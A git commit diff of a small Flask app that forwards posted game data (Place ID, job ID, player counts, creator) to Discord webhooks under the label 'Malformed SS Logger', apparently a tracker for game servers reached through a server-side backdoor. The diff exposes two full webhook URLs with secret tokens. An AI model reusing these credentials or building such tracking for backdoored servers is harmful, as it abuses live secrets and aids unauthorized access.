d33cddd1b703b6f1126398919f805681ac19c28b
dispetcherr <kozmenkovlad9@mail.ru>
2026-02-22 11:59:32 +0300

    Update app.py

--- app.py
+++ app.py
@@ -1,21 +1,21 @@
-хfrom flask import Flask, request
+from flask import Flask, request
 import requests
 
 app = Flask(__name__)
 
 WEBHOOK_SMALL = "https://discord.com/api/webhooks/1475041143552081990/Em8Df8hLd1qGVmsFhE5Lqc0T-q3qKJciA0pk7ihA0G6TWrl4cyXfPldRBhVtuf9qKsNY"
-WEBHOOK_BIG   = "https://discord.com/api/webhooks/1475041311273910463/FIDxmKbEJ8C65HC9sQ9ohz_RX10mSeabPvhQGKmi1cAM_S2aN539dI4FajDTlcsGD_qI"
+WEBHOOK_BIG = "https://discord.com/api/webhooks/1475041311273910463/FIDxmKbEJ8C65HC9sQ9ohz_RX10mSeabPvhQGKmi1cAM_S2aN539dI4FajDTlcsGD_qI"
 
 THRESHOLD = 20
 
 @app.route("/api/log", methods=["POST"])
-def log_game():
+def log():
     data = request.json or {}
     players = int(data.get("players", 0))
     game_id = str(data.get("id", "unknown"))
     name = data.get("name", "Без названия")
     job_id = data.get("job_id", "—")
-    server_players = data.get("server_players", "?—?")
+    server_players = data.get("server_players", "?/?")
     visits = data.get("visits", "?")
     creator = data.get("creator", "?")
     
@@ -33,7 +33,7 @@ def log_game():
             {"name": "Place ID", "value": game_id, "inline": True}
         ],
         "footer": {"text": "Malformed SS Logger"},
-        "timestamp": "now"  # Discord сам подставит
+        "timestamp": "now"
     }
     
     webhook = WEBHOOK_SMALL if players <= THRESHOLD else WEBHOOK_BIG
@@ -44,7 +44,7 @@ def log_game():
     except:
         pass
     
-    return "ok", 200
+    return {"status": "ok"}, 200
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
